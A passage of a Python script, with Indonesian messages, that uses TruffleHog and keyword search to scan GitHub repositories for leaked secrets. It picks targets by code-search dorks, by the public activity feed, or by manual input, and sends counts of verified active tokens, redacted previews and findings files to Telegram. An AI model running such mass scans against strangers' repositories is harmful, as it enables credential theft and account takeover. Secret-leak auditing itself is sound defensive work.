        repo_summaries.append({"repo": repo_name, "matches": len(matches), "failed": False})
        print(f"   → {len(matches)} kecocokan di {repo_name}")

    all_matches = all_matches[:MAX_TOTAL_MATCHES]
    all_matches.sort(key=lambda r: (r["category"] != "potential", r["repo"], r["file"]))
    with open(f"text_search_results{suffix}.json", "w") as f:
        json.dump(all_matches, f, indent=2, ensure_ascii=False)
    print(f"📁 text_search_results{suffix}.json: {len(all_matches)} kecocokan")

    potential = [m for m in all_matches if m["category"] == "potential"]
    noise = [m for m in all_matches if m["category"] == "noise"]

    msg_lines = [
        "🔍 <b>HASIL PENCARIAN TEKS BEBAS</b>",
        "━━━━━━━━━━━━━━━━━━",
        f"🔎 <b>Kata kunci:</b> <code>{html.escape(keyword)}</code>",
        f"🎯 <b>Target:</b> <code>{target_label or TARGET_INPUT}</code>",
        f"📦 <b>Repo Dicari:</b> <b>{total_targets} repositori</b>",
        f"✅ <b>Kecocokan di kode sendiri:</b> <b>{len(potential)}</b>",
        f"🗑️ <b>Kecocokan di vendor/noise:</b> {len(noise)}",
        "━━━━━━━━━━━━━━━━━━",
    ]
    if is_batch:
        msg_lines.append("\n📋 <b>PER REPO:</b>")
        for s in repo_summaries:
            if s.get("failed"):
                msg_lines.append(f"⚠️ <code>{s['repo']}</code> : <b>SEARCH GAGAL</b>")
            else:
                msg_lines.append(f"• <code>{s['repo']}</code> : <b>{s['matches']} kecocokan</b>")
    if potential:
        msg_lines.append("\n📌 <b>KECOCOKAN (kode sendiri):</b>")
        for m in potential[:15]:
            msg_lines.append(
                f"{m['repo']} <code>{m['file']}:{m['line']}</code> ({m['commit']})\n"
                f"   👉 <code>{html.escape(m['content'][:120])}</code>")
        if len(potential) > 15:
            msg_lines.append(f"<i>...dan {len(potential) - 15} kecocokan lainnya ada di file JSON terlampir.</i>")
    elif failed_repos:
        msg_lines.append("\n⚠️ <b>STATUS: PENCARIAN TIDAK LENGKAP!</b> Ada repo yang gagal dicari.")
        for fr in failed_repos:
            msg_lines.append(f"• <code>{fr['repo']}</code>: <code>{html.escape(fr['error'][:200])}</code>")
    else:
        msg_lines.append(f"\n✅ <b>TIDAK KETEMU!</b> Kata <code>{html.escape(keyword)}</code> tidak muncul di repo manapun.")
    if not quiet:
        send_telegram_text("\n".join(msg_lines))

    if all_matches and not quiet:
        send_telegram_document(f"text_search_results{suffix}.json",
                               f"🔍 Hasil pencarian '{keyword}' ({len(all_matches)} kecocokan) — {target_label or TARGET_INPUT}")
    if failed_repos:
        print(f"❌ {len(failed_repos)} repo gagal dicari, keluar dengan error.")
        if not quiet:
            sys.exit(1)
    return all_matches, repo_summaries, failed_repos


def _scan_single_repo(repo_info):
    idx, total_targets, repo_url = repo_info
    repo_name = "/".join(repo_url.rstrip("/").split("/")[-2:])
    print(f"[{idx}/{total_targets}] 🚀 Scanning {repo_name} ({repo_url})...")
    cmd = ["trufflehog", "git", repo_url, "--json", "--no-update"]

    findings = []
    verified = []

    try:
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=REPO_SCAN_TIMEOUT)
    except subprocess.TimeoutExpired:
        print(f"⏰ Timeout ({REPO_SCAN_TIMEOUT}s) terlampaui untuk {repo_name}! Melewati repo ini.")
        return {
            "repo": repo_name, "url": repo_url, "idx": idx, "verified": 0, "total": 0,
            "failed": True, "error": f"Timeout {REPO_SCAN_TIMEOUT}s",
            "findings": [], "verified_findings": []
        }
    except OSError as e:
        print(f"❌ Gagal menjalankan trufflehog untuk {repo_name}: {e}")
        return {
            "repo": repo_name, "url": repo_url, "idx": idx, "verified": 0, "total": 0,
            "failed": True, "error": str(e),
            "findings": [], "verified_findings": []
        }

    if res.returncode not in (0, 1):
        err = (res.stderr or "").strip()[-300:]
        print(f"❌ Scan GAGAL untuk {repo_name} (exit {res.returncode}): {err}")
        return {
            "repo": repo_name, "url": repo_url, "idx": idx, "verified": 0, "total": 0,
            "failed": True, "error": err,
            "findings": [], "verified_findings": []
        }

    repo_verified = 0
    repo_total = 0
    raw_lines = res.stdout.strip().split("\n") if res.stdout.strip() else []
    for line in raw_lines:
        try:
            data = json.loads(line)
            data["_scanned_repo"] = repo_name
            if data.get("Verified", False):
                repo_verified += 1
                verified.append(data)
            findings.append(data)
            repo_total += 1
        except Exception:
            pass

    print(f"✅ Selesai [{idx}/{total_targets}] {repo_name}: {repo_verified} aktif, {repo_total} total.")
    return {
        "repo": repo_name, "url": repo_url, "idx": idx, "verified": repo_verified, "total": repo_total,
        "failed": False, "error": None,
        "findings": findings, "verified_findings": verified
    }
def collect_targets():
    """Kumpulkan target sesuai mode (dork / feed / manual). Return (targets, label, mode, feed_detail, dork_detail)."""
    feed_detail = []
    dork_detail = []   # === [DORK] ===
    # === [UBAH] === Prioritas cabang: DORK dulu (lebih spesifik), lalu FEED, lalu manual
    if DORK_MODE:
        print("🎣 MODE DORK GLOBAL aktif — target dicari via GitHub Code Search.")
        targets, dork_detail = collect_targets_from_dork()
        if not targets:
            send_telegram_text("⚠️ <b>Mode Dork gagal</b> — tidak ada repo kandidat dari code search. "
                               "Cek log runner / pastikan GH_PAT valid & env DORK_QUERIES benar.")
            sys.exit(1)
        target_label = "DORK GLOBAL (code search)"
        mode_tag = "dork"
    elif FEED_MODE:
        print("🛰️ MODE FEED GLOBAL aktif — target ditentukan otomatis.")
        targets, feed_detail = collect_targets_from_feed()
        if not targets:
            send_telegram_text("⚠️ <b>Mode Feed gagal</b> — tidak ada user/repo yang bisa diambil dari event publik. Cek log runner / rate limit (pakai GH_PAT!).")
            sys.exit(1)
        target_label = f"FEED GLOBAL · {len(feed_detail)} user aktif"
        mode_tag = "feed"
    else:
        if not TARGET_INPUT:
            print("❌ Error: No target input provided. (atau pakai target 'feed' / 'dork' / env DORK_MODE=1)")
            sys.exit(1)
        targets = resolve_target_repos(TARGET_INPUT)
        target_label = TARGET_INPUT
        mode_tag = "manual"

    return targets, target_label, mode_tag, feed_detail, dork_detail


def send_start_message(targets, target_label, mode_tag, feed_detail, dork_detail, is_batch):
    """Kirim pesan Telegram DIMULAI sesuai mode (dipakai jalur lama & collect-only)."""
    total_targets = len(targets)
    # === [UBAH] === Pesan mulai: tambah cabang untuk mode DORK
    if mode_tag == "dork" and is_batch:
        q_list = "\n".join(f"• <code>{html.escape(d['query'])}</code> → {d['found']} repo"
                           for d in dork_detail if not d.get("error"))
        send_telegram_text(
            f"🎣 <b>DORK-HUNT SCAN DIMULAI!</b>\n\n"
            f"🌐 <b>Target:</b> Hasil dork Code Search seluruh GitHub\n"
            f"{q_list}\n\n"
            f"📦 <b>Total Repositori:</b> <b>{total_targets} repo</b>\n"
            f"⏳ <i>Runner memindai repo-repo yang file sensitifnya terindikasi...</i>")
    elif mode_tag == "dork":
        send_telegram_text(
            f"🎣 <b>DORK-HUNT SCAN DIMULAI!</b>\n\n"
            f"🎯 <b>Target:</b> <code>{targets[0]}</code> (<i>dari code search</i>)\n"
            f"⏳ <i>Sedang mengendus seluruh riwayat commit...</i>")
    elif FEED_MODE and is_batch:
        user_list = ", ".join(f"@{d['user']}" for d in feed_detail[:10])
        send_telegram_text(
            f"🛰️ <b>FEED-HUNT SCAN DIMULAI!</b>\n\n"
            f"📡 <b>Target:</b> Auto dari feed global GitHub\n"
            f"👤 <b>User terpilih:</b> {user_list}\n"
            f"📦 <b>Total Repositori:</b> <b>{total_targets} repo</b>\n"
            f"⏳ <i>Runner menyedot repo hasil aktivitas paling baru...</i>")
    elif is_batch:
        send_telegram_text(f"🚀 <b>TRUFFLEHOG BATCH SCAN DIMULAI!</b>\n\n👤 <b>Target Akun:</b> <code>{target_label}</code>\n📦 <b>Total Repositori:</b> <b>{total_targets} repo</b>\n⏳ <i>Runner sedang menyisir seluruh repositori satu per satu...</i>")
    else:
        send_telegram_text(f"🔍 <b>TruffleHog Security Scan Dimulai!</b>\n\n🎯 <b>Target:</b> <code>{targets[0]}</code>\n⏳ <i>Sedang mengendus seluruh riwayat commit...</i>")



def run_parallel_scan(targets, suffix=""):
    """Scan semua target paralel, tulis findings_{bucket}{suffix}.json. Return dict hasil."""
    total_targets = len(targets)
    all_findings = []
    verified_findings = []
    repo_summaries = []
    failed_repos = []

    tasks = [(i, total_targets, url) for i, url in enumerate(targets, 1)]
    print(f"⚡ Menjalankan parallel scan ({CONCURRENCY_WORKERS} workers, timeout {REPO_SCAN_TIMEOUT}s/repo)...")

    with ThreadPoolExecutor(max_workers=CONCURRENCY_WORKERS) as executor:
        future_map = {executor.submit(_scan_single_repo, t): t for t in tasks}
        for future in as_completed(future_map):
            res_item = future.result()
            repo_summaries.append({
                "repo": res_item["repo"],
                "url": res_item["url"],
                "idx": res_item["idx"],
                "verified": res_item["verified"],
                "total": res_item["total"],
                "failed": res_item["failed"]
            })
            if res_item["failed"]:
                failed_repos.append({"repo": res_item["repo"], "url": res_item["url"], "idx": res_item["idx"], "error": res_item["error"]})
            else:
                all_findings.extend(res_item["findings"])
                verified_findings.extend(res_item["verified_findings"])

    repo_summaries.sort(key=lambda s: s.get("idx", 0))
    failed_repos.sort(key=lambda s: s.get("idx", 0))

    buckets = {"active": [], "potential": [], "noise": []}
    seen_split = set()
    for data in all_findings:
        bucket, reason = classify_finding(data)
        rec = safe_record(data, bucket, reason)
        key = (rec["detector"], str(data.get("Verified")), rec["redacted"],
               rec["repo"], rec["file"], str(rec["line"]), rec["commit"])
        if key in seen_split:
            continue
        seen_split.add(key)
        buckets[bucket].append(rec)
    for bucket, rows in buckets.items():
        rows.sort(key=lambda r: (r["detector"], r["repo"], r["file"]))
        with open(f"findings_{bucket}{suffix}.json", "w") as f:
            json.dump(rows, f, indent=2, ensure_ascii=False)
        print(f"📁 findings_{bucket}{suffix}.json: {len(rows)} temuan")

    total_verified = len(verified_findings)
    total_leaks = len(all_findings)

    return {
        "repo_summaries": repo_summaries,
        "failed_repos": failed_repos,
        "buckets": buckets,
        "total_verified": total_verified,
        "total_leaks": total_leaks,
    }


def send_scan_report(target_label, mode_tag, total_targets, repo_summaries, failed_repos,
                   buckets, total_verified, total_leaks, feed_detail, dork_detail, is_batch):
    """Bangun + kirim laporan Telegram (teks + file). Dipakai jalur lama & merge-only."""
    total_active = len(buckets["active"])
    total_potential = len(buckets["potential"])
    total_noise = len(buckets["noise"])

    # === [UBAH] === Label target di laporan menyesuaikan mode
    if mode_tag == "dork":
        report_target_label = "DORK GLOBAL (code search)"
    elif FEED_MODE:
        report_target_label = "FEED GLOBAL (auto)"
    else:
        report_target_label = target_label

    msg_lines = [
        "📊 <b>LAPORAN HASIL AUDIT TRUFFLEHOG</b>",
        "━━━━━━━━━━━━━━━━━━",
        f"🎯 <b>Target:</b> <code>{report_target_label}</code>",
        f"📦 <b>Repo Discan:</b> <b>{total_targets} repositori</b>",
        f"🚨 <b>Aktif (verified):</b> <b>{total_active}</b>",
        f"⚠️ <b>Potensial:</b> {total_potential}",
        f"🗑️ <b>Noise:</b> {total_noise}",
        f"📊 <b>Total Temuan:</b> {total_leaks}",
        "━━━━━━━━━━━━━━━━━━"
    ]

    if is_batch:
        msg_lines.append("\n📋 <b>RINGKASAN STATUS REPO:</b>")
        for s in repo_summaries:
            if s.get("failed"):
                msg_lines.append(f"⚠️ <code>{s['repo']}</code> : <b>SCAN GAGAL</b>")
            else:
                icon = "❌" if s["verified"] > 0 else "✅"
                msg_lines.append(f"{icon} <code>{s['repo']}</code> : <b>{s['verified']} aktif bocor</b> ({s['total']} potensi)")
        # === [DORK] === info query yang dipakai run ini
        if mode_tag == "dork" and dork_detail:
            q_short = ", ".join(f"<code>{html.escape(d['query'][:40])}</code>" for d in dork_detail[:5])
            msg_lines.append(f"\n🎣 <i>Query dork run ini: {q_short}</i>")
        if FEED_MODE and feed_detail:
            msg_lines.append(f"\n🛰️ <i>Target picked otomatis dari feed: "
                             f"{', '.join('@'+d['user'] for d in feed_detail[:10])}</i>")

    if total_active > 0:
        msg_lines.append("\n🔥 <b>DETAIL TOKEN AKTIF BOCOR:</b>")
        for i, f in enumerate(buckets["active"][:15], 1):
            msg_lines.append(f"{i}. <b>[{f['detector']}]</b> di <code>{f['repo']}</code> (commit: <code>{f['commit']}</code>)\n   👉 Token: <code>{f['redacted'][:40]}</code>")
        if total_active > 15:
            msg_lines.append(f"<i>...dan {total_active - 15} temuan lainnya ada di file JSON terlampir.</i>")
    elif failed_repos:
        msg_lines.append("\n⚠️ <b>STATUS: SCAN TIDAK LENGKAP!</b> Ada repo yang gagal discan — hasil di atas belum bisa dipercaya sebagai \"aman\".")
        for fr in failed_repos:
            msg_lines.append(f"• <code>{fr['repo']}</code>: <code>{html.escape(fr['error'][:200])}</code>")
    else:
        msg_lines.append("\n🏆 <b>STATUS: 100% AMAN!</b> Tidak ada kunci rahasia aktif yang bocor!")

    report_text = "\n".join(msg_lines)
    send_telegram_text(report_text)

    if total_active > 0:
        send_telegram_document("findings_active.json", f"🚨 File JSON Temuan AKTIF ({total_active}) — {report_target_label}")
    if total_potential > 0:
        send_telegram_document("findings_potential.json", f"⚠️ File JSON Temuan POTENSIAL ({total_potential}) — {report_target_label}")

    if failed_repos:
        print(f"❌ {len(failed_repos)} repo gagal discan, keluar dengan error.")
        return 1
    return 0



# === [SHARD] === Mode workflow matrix (4 shard) ============================
def _load_targets_file():
    """Baca targets.json hasil job collect."""
    with open(TARGETS_FILE) as f:
        return json.load(f)

def _mode_collect_only():
    """Job collect: kumpulkan target, kirim pesan DIMULAI, tulis targets.json."""
    targets, target_label, mode_tag, feed_detail, dork_detail = collect_targets()
    total_targets = len(targets)
    if total_targets == 0:
        send_telegram_text(f"⚠️ Tidak ditemukan repositori untuk target: <code>{target_label}</code>")
        sys.exit(1)
    is_batch = total_targets > 1
    if SEARCH_KEYWORD:
        send_telegram_text(
            f"🔍 <b>PENCARIAN TEKS BEBAS DIMULAI!</b>\n\n🔎 <b>Kata kunci:</b> <code>{html.escape(SEARCH_KEYWORD)}</code>\n"
            f"🎯 <b>Target:</b> <code>{target_label}</code>\n📦 <b>Total Repositori:</b> <b>{total_targets} repo</b>\n"
            f"⏳ <i>Sedang menyisir seluruh history commit...</i>")
    else:
        send_start_message(targets, target_label, mode_tag, feed_detail, dork_detail, is_batch)
    data = {
        "targets": targets,
        "target_label": target_label,
        "mode_tag": mode_tag,
        "feed_detail": feed_detail,
        "dork_detail": dork_detail,
        "search_keyword": SEARCH_KEYWORD,
    }
    with open("targets.json", "w") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    print(f"📁 targets.json: {total_targets} repo target (mode {mode_tag})")

    # Persistensikan target yang baru dikumpulkan ke branch 'state' agar scan berikutnya 100% repo baru
    if mode_tag in ("dork", "feed") and targets:
        try:
            new_repos = set()
            new_users = set()
            for t in targets:
                clean_t = t.rstrip("/").split("/")
                if len(clean_t) >= 2:
                    repo_full = f"{clean_t[-2]}/{clean_t[-1]}"
                    new_repos.add(repo_full)
                    new_users.add(clean_t[-2])
            print(f"💾 Menyimpan {len(new_repos)} repo & {len(new_users)} user baru ke cache riwayat (branch '{CACHE_BRANCH}')...")
            _save_scanned_history(new_repos, new_users)
        except Exception as e:
            print(f"⚠️ Gagal auto-update cache saat collect: {e}")

def _mode_shard_scan():
    """Job scan matrix: scan hanya shard ke-SHARD_INDEX (round-robin), tulis file shard."""
    data = _load_targets_file()
    targets_all = data["targets"]
    target_label = data.get("target_label", "")
    shard_targets = targets_all[SHARD_INDEX::SHARD_TOTAL]
    suffix = f"_shard{SHARD_INDEX}"
    print(f"🧩 SHARD {SHARD_INDEX}/{SHARD_TOTAL}: {len(shard_targets)} dari {len(targets_all)} repo")
    keyword = data.get("search_keyword") or ""
    if keyword:
        all_matches, repo_summaries, failed_repos = run_text_search(
            shard_targets, keyword, target_label, suffix=suffix, quiet=True)
        summary = {"shard": SHARD_INDEX, "shard_total": SHARD_TOTAL, "mode": "search",
                   "keyword": keyword, "target_label": target_label,
                   "total_targets": len(shard_targets), "total_matches": len(all_matches),
                   "repo_summaries": repo_summaries, "failed_repos": failed_repos}
    else:
        res = run_parallel_scan(shard_targets, suffix=suffix)
        summary = {"shard": SHARD_INDEX, "shard_total": SHARD_TOTAL, "mode": "scan",
                   "target_label": target_label,
                   "total_targets": len(shard_targets),
                   "total_verified": res["total_verified"], "total_leaks": res["total_leaks"],
                   "repo_summaries": res["repo_summaries"], "failed_repos": res["failed_repos"]}
    with open(f"scan_summary{suffix}.json", "w") as f:
        json.dump(summary, f, indent=2, ensure_ascii=False)
    print(f"📁 scan_summary{suffix}.json: {len(summary['failed_repos'])} gagal")
    if summary["failed_repos"]:
        sys.exit(1)

def _mode_merge_only():
    """Job report: gabung semua shard, kirim SATU laporan Telegram, tulis file gabungan."""
    data = _load_targets_file()
    target_label = data.get("target_label", "")
    mode_tag = data.get("mode_tag", "")
    keyword = data.get("search_keyword") or ""
    total_targets = len(data["targets"])
    is_batch = total_targets > 1
    summaries, failed_all, repo_all = [], [], []
    if keyword:
        merged, seen_keys = [], set()
        for n in range(SHARD_TOTAL):
            p = f"text_search_results_shard{n}.json"
            if not os.path.exists(p):
                print(f"⚠️ File shard hilang: {p} (job shard {n} mungkin gagal total)")
                continue
            with open(p) as f:
                rows = json.load(f)
            for r in rows:
                key = (r.get("repo"), r.get("file"), str(r.get("line")), (r.get("content") or "")[:80])
                if key in seen_keys:
                    continue
                seen_keys.add(key)
                merged.append(r)
            s = json.load(open(f"scan_summary_shard{n}.json")) if os.path.exists(f"scan_summary_shard{n}.json") else None
            if s:
                summaries.append(s)
                failed_all.extend(s.get("failed_repos", []))
                repo_all.extend(s.get("repo_summaries", []))
        merged.sort(key=lambda r: (r.get("category") != "potential", r.get("repo", ""), r.get("file", "")))
        merged = merged[:MAX_TOTAL_MATCHES]
        with open("text_search_results.json", "w") as f:
            json.dump(merged, f, indent=2, ensure_ascii=False)
        potential = [m for m in merged if m.get("category") == "potential"]
        noise = [m for m in merged if m.get("category") == "noise"]
        msg_lines = [
            "🔍 <b>HASIL PENCARIAN TEKS BEBAS</b>",
            "━━━━━━━━━━━━━━━━━━",
            f"🔎 <b>Kata kunci:</b> <code>{html.escape(keyword)}</code>",
            f"🎯 <b>Target:</b> <code>{target_label}</code>",
            f"📦 <b>Repo Dicari:</b> <b>{total_targets} repositori</b>",
            f"✅ <b>Kecocokan di kode sendiri:</b> <b>{len(potential)}</b>",
            f"🗑️ <b>Kecocokan di vendor/noise:</b> {len(noise)}",
            "━━━━━━━━━━━━━━━━━━",
        ]
        if is_batch:
            msg_lines.append("\n📋 <b>PER REPO:</b>")
            for s in sorted(repo_all, key=lambda x: x.get("repo", "")):
                if s.get("failed"):
                    msg_lines.append(f"⚠️ <code>{s['repo']}</code> : <b>SEARCH GAGAL</b>")
                else:
                    msg_lines.append(f"• <code>{s['repo']}</code> : <b>{s['matches']} kecocokan</b>")
        if potential:
            msg_lines.append("\n📌 <b>KECOCOKAN (kode sendiri):</b>")
            for m in potential[:15]:
                msg_lines.append(
                    f"{m['repo']} <code>{m['file']}:{m['line']}</code> ({m['commit']})\n"
                    f"   👉 <code>{html.escape(m['content'][:120])}</code>")
            if len(potential) > 15:
                msg_lines.append(f"<i>...dan {len(potential) - 15} kecocokan lainnya ada di file JSON terlampir.</i>")
        elif failed_all:
            msg_lines.append("\n⚠️ <b>STATUS: PENCARIAN TIDAK LENGKAP!</b> Ada repo yang gagal dicari.")
            for fr in failed_all:
                msg_lines.append(f"• <code>{fr['repo']}</code>: <code>{html.escape(fr['error'][:200])}</code>")
        else:
            msg_lines.append(f"\n✅ <b>TIDAK KETEMU!</b> Kata <code>{html.escape(keyword)}</code> tidak muncul di repo manapun.")
        send_telegram_text("\n".join(msg_lines))
        if merged:
            send_telegram_document("text_search_results.json",
                                   f"🔍 Hasil pencarian '{keyword}' ({len(merged)} kecocokan) — {target_label}")
        if failed_all:
            print(f"❌ {len(failed_all)} repo gagal dicari, keluar dengan error.")
            sys.exit(1)
        return
    # --- mode scan biasa: gabung findings per bucket + summary ---
    buckets = {"active": [], "potential": [], "noise": []}
    seen_split = set()
    total_verified = 0
    total_leaks = 0
    for n in range(SHARD_TOTAL):
        sp = f"scan_summary_shard{n}.json"
        if not os.path.exists(sp):
            print(f"⚠️ File shard hilang: {sp} (job shard {n} mungkin gagal total)")
            continue
        s = json.load(open(sp))
        summaries.append(s)
        failed_all.extend(s.get("failed_repos", []))
        repo_all.extend(s.get("repo_summaries", []))
        total_verified += s.get("total_verified", 0)
        total_leaks += s.get("total_leaks", 0)
        for bucket in buckets:
            p = f"findings_{bucket}_shard{n}.json"
            if not os.path.exists(p):
                continue
            with open(p) as f:
                rows = json.load(f)
            for rec in rows:
                key = (rec.get("detector"), str(rec.get("verified")), rec.get("redacted"),
                       rec.get("repo"), rec.get("file"), str(rec.get("line")), rec.get("commit"))
                if key in seen_split:
                    continue
                seen_split.add(key)
                buckets[bucket].append(rec)
    repo_all.sort(key=lambda s: s.get("idx", 0))
    failed_all.sort(key=lambda s: s.get("idx", 0))
    for bucket, rows in buckets.items():
        rows.sort(key=lambda r: (r.get("detector", ""), r.get("repo", ""), r.get("file", "")))
        with open(f"findings_{bucket}.json", "w") as f:
            json.dump(rows, f, indent=2, ensure_ascii=False)
        print(f"📁 findings_{bucket}.json: {len(rows)} temuan")
    feed_detail = data.get("feed_detail", [])
    dork_detail = data.get("dork_detail", [])
    rc = send_scan_report(target_label, mode_tag, total_targets, repo_all, failed_all,
                          buckets, total_verified, total_leaks, feed_detail, dork_detail, is_batch)
    if rc:
        sys.exit(1)


def main():
    # === [SHARD] === Mode workflow matrix (collect / shard / merge)
    if COLLECT_ONLY:
        _mode_collect_only()
        return
    if MERGE_ONLY:
        _mode_merge_only()
        return
    if SHARD_INDEX >= 0:
        _mode_shard_scan()
        return

    # --- Jalur lama (single-job): kumpul + scan + lapor sekaligus ---
    targets, target_label, mode_tag, feed_detail, dork_detail = collect_targets()

    # Mode pencarian teks bebas: -bebas <keyword>
    if SEARCH_KEYWORD:
        run_text_search(targets, SEARCH_KEYWORD, target_label)
        return

    total_targets = len(targets)

    if total_targets == 0:
        send_telegram_text(f"⚠️ Tidak ditemukan repositori untuk target: <code>{target_label}</code>")
        return

    is_batch = total_targets > 1
    send_start_message(targets, target_label, mode_tag, feed_detail, dork_detail, is_batch)

    res = run_parallel_scan(targets)
    try:
        new_repos = {s.get("repo") for s in res.get("repo_summaries", []) if s.get("repo")}
        new_users = {r.split("/")[0] for r in new_repos if "/" in r}
        _save_scanned_history(new_repos, new_users)
    except Exception as ce:
        print(f"⚠️ Gagal simpan riwayat cache: {ce}")
    rc = send_scan_report(target_label, mode_tag, total_targets,
                          res["repo_summaries"], res["failed_repos"], res["buckets"],
                          res["total_verified"], res["total_leaks"],
                          feed_detail, dork_detail, is_batch)
    if rc:
        sys.exit(1)

if __name__ == "__main__":
    main()
